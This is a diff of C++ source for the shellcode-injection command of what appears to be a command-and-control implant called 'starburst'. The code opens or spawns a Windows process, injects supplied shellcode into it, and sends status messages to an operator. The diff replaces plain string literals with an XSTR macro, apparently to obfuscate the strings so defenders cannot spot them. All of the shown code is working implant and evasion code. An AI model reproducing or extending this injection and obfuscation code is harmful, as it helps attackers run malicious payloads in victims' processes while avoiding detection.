@@ -23,7 +23,7 @@ auto declfn starburst::cmd_spawn(
 
     if ( !sc_data || sc_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no shellcode provided" ) ) );
+            XSTR( "no shellcode provided" ) );
         return;
     }
 
@@ -36,7 +36,7 @@ auto declfn starburst::cmd_spawn(
         h_proc = inst.kernel32.OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
         if ( !h_proc ) {
             char msg[80] = { 0 };
-            str_copy( msg, symbol<char*>( const_cast<char*>( "OpenProcess failed for PID " ) ) );
+            str_copy( msg, XSTR( "OpenProcess failed for PID " ) );
             char num[16];
             int_to_str( num, pid, 10 );
             str_concat( msg, num );
@@ -52,7 +52,7 @@ auto declfn starburst::cmd_spawn(
 
         if ( !app_path[0] ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "spawnto_x64 not set" ) ) );
+                XSTR( "spawnto_x64 not set" ) );
             return;
         }
 
@@ -60,7 +60,7 @@ auto declfn starburst::cmd_spawn(
         char cmdline_a[600] = { 0 };
         str_copy( cmdline_a, app_path );
         if ( app_args[0] ) {
-            str_concat( cmdline_a, symbol<char*>( const_cast<char*>( " " ) ) );
+            str_concat( cmdline_a, XSTR( " " ) );
             str_concat( cmdline_a, app_args );
         }
 
@@ -80,7 +80,7 @@ auto declfn starburst::cmd_spawn(
 
         if ( !ok ) {
             char msg[340] = { 0 };
-            str_copy( msg, symbol<char*>( const_cast<char*>( "CreateProcess failed for: " ) ) );
+            str_copy( msg, XSTR( "CreateProcess failed for: " ) );
             str_concat( msg, cmdline_a );
             queue_response( inst, task_uuid, RESPONSE_ERROR, msg );
             return;
@@ -96,7 +96,7 @@ auto declfn starburst::cmd_spawn(
             inst.kernel32.CloseHandle( pi.hThread );
             inst.kernel32.CloseHandle( pi.hProcess );
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "injection into spawned process failed" ) ) );
+                XSTR( "injection into spawned process failed" ) );
             return;
         }
 
@@ -116,7 +116,7 @@ auto declfn starburst::cmd_spawn(
     if ( !h_thread ) {
         inst.kernel32.CloseHandle( h_proc );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "injection failed" ) ) );
+            XSTR( "injection failed" ) );
         return;
     }
 
@@ -124,11 +124,11 @@ auto declfn starburst::cmd_spawn(
     inst.kernel32.CloseHandle( h_proc );
 
     char msg[120] = { 0 };
-    str_copy( msg, symbol<char*>( const_cast<char*>( "injected " ) ) );
+    str_copy( msg, XSTR( "injected " ) );
     char num[16];
     int_to_str( num, sc_len, 10 );
     str_concat( msg, num );
-    str_concat( msg, symbol<char*>( const_cast<char*>( " bytes into PID " ) ) );
+    str_concat( msg, XSTR( " bytes into PID " ) );
     int_to_str( num, target_pid, 10 );
     str_concat( msg, num );
 
